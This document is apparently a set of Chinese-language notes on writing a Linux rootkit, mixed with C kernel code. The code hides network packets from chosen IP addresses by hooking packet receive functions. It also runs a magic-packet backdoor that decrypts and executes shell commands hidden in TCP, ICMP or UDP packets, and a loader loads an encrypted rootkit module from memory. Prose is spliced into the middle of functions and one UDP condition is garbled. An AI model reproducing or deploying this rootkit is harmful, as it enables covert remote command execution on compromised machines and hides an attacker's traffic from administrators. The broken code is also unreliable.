    {
      if (existing_entry_v4->ipv4_addr == ipv4_addr) {
        /* There is already an entry in the list */
        return;
      }
    }
    new_entry_v4 = kmalloc(sizeof(struct ipv4_entry), GFP_KERNEL);
    if (!new_entry_v4) {
      return;
    }
    memcpy(new_entry_v4->ipv4_addr, ipv4_addr, IPV4_LENGTH);
    list_add(&new_entry_v4->list, &ipv4_list);
    return;
  }
  if (in6_pton(ip, -1, ipv6_addr, -1, NULL)
      && !strncmp(protocol, "ipv6", 4)) {
    /* no errors, check for occurrence in list */
    list_for_each_entry_safe(existing_entry_v6, tmp_v6, &ipv6_list, list)
    {
      if (existing_entry_v6->ipv6_addr == ipv6_addr) {
        return;
      }
    }
    new_entry_v6 = kmalloc(sizeof(struct ipv4_entry), GFP_KERNEL);
    if (!new_entry_v6) {
      return;
    }
    memcpy(new_entry_v6->ipv6_addr, ipv6_addr, IPV6_LENGTH);
    list_add(&new_entry_v6->list, &ipv6_list);
  }
}
/*
 * Remove a ip address from the list
 */
void packet_unhide(char *protocol, char *ip) {
  u8 ipv4_addr[4];
  u8 ipv6_addr[16];
  struct ipv4_entry *existing_entry_v4, *tmp_v4;
  struct ipv6_entry *existing_entry_v6, *tmp_v6;
  if (in4_pton(ip, -1, ipv4_addr, -1, NULL) && !strcmp(protocol, "ipv4")) {
    /* ipv4 address in list, remove */
    list_for_each_entry_safe(existing_entry_v4, tmp_v4, &ipv4_list, list)
    {
      if (existing_entry_v4->ipv4_addr == ipv4_addr) {
        // if entry is in list, remove it
        list_del(&(existing_entry_v4->list));
        kfree(existing_entry_v4);
        return;
      }
    }
    return;
  }
  if (in6_pton(ip, -1, ipv6_addr, -1, NULL) && !strcmp(protocol, "ipv6")) {
    /* ipv6 address in list, remove */
    list_for_each_entry_safe(existing_entry_v6, tmp_v6, &ipv6_list, list)
    {
      if (existing_entry_v6->ipv6_addr == ipv6_addr) {
        /* if entry is in list, remove it */
        list_del(&(existing_entry_v6->list));
        kfree(existing_entry_v6);
        return;
      }
    }
  }
}
/*
 * Hook function for packet rcv
 */
int new_packet_rcv(struct sk_buff *skb, struct net_device *dev,
    struct packet_type *pt, struct net_device *orig_dev) {
  int ret;
  inc_critical(&lock_packet_rcv, &accesses_packet_rcv);
  /* Check if we need to hide packet */
  if (packet_check(skb)) {
    dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
    return NF_DROP;
  }
  ret = old_packet_rcv(skb, dev, pt, orig_dev);
  dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
  return ret;
}
/*
 * Hook function for tpacket rcv
 */
int new_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
    struct packet_type *pt, struct net_device *orig_dev) {
  int ret;
  inc_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
  if (packet_check(skb)) {
    dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
    return NF_DROP;
  }
  ret = old_tpacket_rcv(skb, dev, pt, orig_dev);
  dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
  return ret;
}
/*
 * hook function for packet rcv spkt
 */
int new_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,
    struct packet_type *pt, struct net_device *orig_dev) {
  int ret;
  inc_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
  if (packet_check(skb)) {
    dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
    return NF_DROP;
  }
  ret = old_packet_rcv_spkt(skb, dev, pt, orig_dev);
  dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
  return ret;
}
void initialize_hide_packets(void) {
  hook_packet_rcv = add_function_hook_to_list("packet_rcv", new_packet_rcv,
      &old_packet_rcv);
  hook_tpacket_rcv = add_function_hook_to_list("tpacket_rcv", new_tpacket_rcv,
      &old_tpacket_rcv);
icmp/tcp/udp敲⻔
主要使⽤了 nf_register_hook  启动了⼀个线程死循环，当有icmp/tcp/udp触发，死循环进⼊shell空间。
还有⼀种⽅案是对 ip_rcv 进⾏hook，这种不依赖版本
  hook_packet_rcv_spkt = add_function_hook_to_list("packet_rcv_spkt",
      new_packet_rcv_spkt, &old_packet_rcv_spkt);
  /* initialize mutexes */
  mutex_init(&lock_packet_rcv);
  mutex_init(&lock_tpacket_rcv);
  mutex_init(&lock_packet_rcv_spkt);
}
void remove_hide_packets(void) {
  while (accesses_packet_rcv > 0 || accesses_tpacket_rcv > 0
      || accesses_packet_rcv_spkt > 0) {
    msleep(50);
  }
}
#include 
static int khook_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type 
*pt, 
            struct net_device *orig_dev)
{
  if (magic_packet_parse(skb))
    return KHOOK_ORIGIN(ip_rcv, skb, dev, pt, orig_dev);
  return 0;
}
#define DROP 0
#define ACCEPT 1
unsigned int magic_packet_parse(struct sk_buff *socket_buffer)
{
  const struct iphdr *ip_header;
  const struct icmphdr *icmp_header;
  const struct tcphdr *tcp_header;
  const struct udphdr *udp_header;
  struct iphdr _iph;
  struct icmphdr _icmph;
  struct tcphdr _tcph;
  struct udphdr _udph;
  const char *data = NULL;
  char *_data, *argv_str, **argv;
  int size, str_size;
  if (!socket_buffer)
    return ACCEPT;
  ip_header = skb_header_pointer(socket_buffer, 0, sizeof(_iph), &_iph);
  if (!ip_header)
    return ACCEPT;
  if (!ip_header->protocol)
    return ACCEPT;
  if (htons(ip_header->id) != IPID)
    return ACCEPT;
  if (ip_header->protocol == IPPROTO_TCP) {
    tcp_header = skb_header_pointer(socket_buffer, ip_header->ihl * 4, sizeof(_tcph), 
&_tcph);
    if (!tcp_header)
      return ACCEPT;
    if (htons(tcp_header->source) != SRCPORT)
      return ACCEPT;
    if (//htons(tcp_header->seq) == SEQ &&   /* uncoment this if you wanna use 
tcp_header->seq as filter */
      htons(tcp_header->window) == WIN) {
      size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_tcph);
      _data = kmalloc(size, GFP_KERNEL);
      if (!_data)
        return ACCEPT;
      str_size = size - strlen(MAGIC_VALUE);
      argv_str = kmalloc(str_size, GFP_KERNEL);
      if (!argv_str) {
        kfree(_data);
        return ACCEPT;
      }
      data = skb_header_pointer(socket_buffer, ip_header->ihl * 4 + sizeof(struct 
tcphdr), size, &_data);
      if (!data) {
        kfree(_data);
        kfree(argv_str);
        return ACCEPT;
      }
      if (memcmp(data, MAGIC_VALUE, strlen(MAGIC_VALUE)) == 0) {
        memzero_explicit(argv_str, str_size);
        memcpy(argv_str, data + strlen(MAGIC_VALUE) + 1, str_size - 1);
        do_decrypt(argv_str, str_size - 1, KEY);
        argv = argv_split(GFP_KERNEL, argv_str, NULL);
        if (argv) {
          shell_exec_queue(argv[0], argv[1]);
          argv_free(argv);
        }
        kfree(_data);
        kfree(argv_str);
        return DROP;
      }
      kfree(_data);
      kfree(argv_str);
    }
  }
  if (ip_header->protocol == IPPROTO_ICMP) {
    icmp_header = skb_header_pointer(socket_buffer, ip_header->ihl * 4, sizeof(_icmph), 
&_icmph);
    if (!icmp_header)
      return ACCEPT;
    if (icmp_header->code != ICMP_ECHO)
      return ACCEPT;
    if (htons(icmp_header->un.echo.sequence) == SEQ &&
        htons(icmp_header->un.echo.id) == WIN) {
      size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_icmph);
      _data = kmalloc(size, GFP_KERNEL);
      if (!_data)
        return ACCEPT;
      str_size = size - strlen(MAGIC_VALUE);
      argv_str = kmalloc(str_size, GFP_KERNEL);
      if (!argv_str) {
        kfree(_data);
        return ACCEPT;
      }
      data = skb_header_pointer(socket_buffer, ip_header->ihl * 4 + sizeof(struct 
icmphdr), size, &_data);
      if (!data) {
        kfree(_data);
        kfree(argv_str);
        return ACCEPT;
      }
      if (memcmp(data, MAGIC_VALUE, strlen(MAGIC_VALUE)) == 0) {
        memzero_explicit(argv_str, str_size);
        memcpy(argv_str, data + strlen(MAGIC_VALUE) + 1, str_size - 1);
        do_decrypt(argv_str, str_size - 1, KEY);
        argv = argv_split(GFP_KERNEL, argv_str, NULL);
        if (argv) {
          shell_exec_queue(argv[0], argv[1]);
          argv_free(argv);
        }
        kfree(_data);
        kfree(argv_str);
        return DROP;
      }
      kfree(_data);
      kfree(argv_str);
    }
  }
  if (ip_header->protocol == IPPROTO_UDP) {
    udp_header = skb_header_pointer(socket_buffer, ip_header->ihl * 4, sizeof(_udph), 
&_udph);
    if (!udp_header)
      return ACCEPT;
    if (htons(udp_header->source) != SRCPORT)
      return ACCEPT;
    if (htons(udp_header->len) tot_len) - sizeof(_iph) - sizeof(_udph);
      _data = kmalloc(size, GFP_KERNEL);
      if (!_data)
        return ACCEPT;
      str_size = size - strlen(MAGIC_VALUE);
      argv_str = kmalloc(str_size, GFP_KERNEL);
      if (!argv_str) {
        kfree(_data);
        return ACCEPT;
      }
      data = skb_header_pointer(socket_buffer, ip_header->ihl * 4 + sizeof(struct 
udphdr), size, &_data);
      if (!data) {
        kfree(_data);
        kfree(argv_str);
        return ACCEPT;
      }
      if (memcmp(data, MAGIC_VALUE, strlen(MAGIC_VALUE)) == 0) {
        memzero_explicit(argv_str, str_size);
        memcpy(argv_str, data + strlen(MAGIC_VALUE) + 1, str_size - 1);
        do_decrypt(argv_str, str_size - 1, KEY);
        argv = argv_split(GFP_KERNEL, argv_str, NULL);
        if (argv) {
          shell_exec_queue(argv[0], argv[1]);
          argv_free(argv);
        }
        kfree(_data);
        kfree(argv_str);
        return DROP;
      }
Loader
虽然可以使⽤ insmod 命令⼿动安装模块，但使⽤loader，只需要调⽤syscall，⽤任意语⾔实现都⾏。
可以直接内存加载，再编码加个密钥什么的就⾮常⽅便了。
      kfree(_data);
      kfree(argv_str);
    }
  }
  return ACCEPT;
}
#define _GNU_SOURCE
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include "encrypt.h"
static char reptile_blob[] = {
#include "reptile.ko.inc"
};
#define init_module(module_image, len, param_values) syscall(__NR_init_module, 
module_image, len, param_values)
int main(void)
{
  int ret = EXIT_FAILURE;
  size_t len;
  void *module_image;
  len = sizeof(reptile_blob);
  do_decrypt(reptile_blob, len, DECRYPT_KEY);
  module_image = malloc(len);
  memcpy(module_image, reptile_blob, len);
  init_module(module_image, len, "");
  if (errno == 37)
shell回显
这块有想法，还没实践。
主要利⽤现有的端⼝进⾏socket reuse，⽽不只局限在80 http的服务中，hook tcp rcv函数，根据特定的字段获取
指令执⾏，并根据接收时获得的socket描述符，往⾥⾯加密写⼊回显内容。
参考
简易 Linux Rootkit 编写⼊⻔指北（⼀）：模块隐藏与进程提权
https://www.anquanke.com/post/id/246749
Linux Rootkit 第 1 部分：介绍和⼯作流程
这是⼀个合集，写的都挺好
Linux Rootkit 研究
https://github.com/NoviceLive/research-rootkit/blob/master/README-zh_CN.rst
https://github.com/Mote-Z/rootkit
    ret = EXIT_SUCCESS;
  free(module_image);
  return ret;
}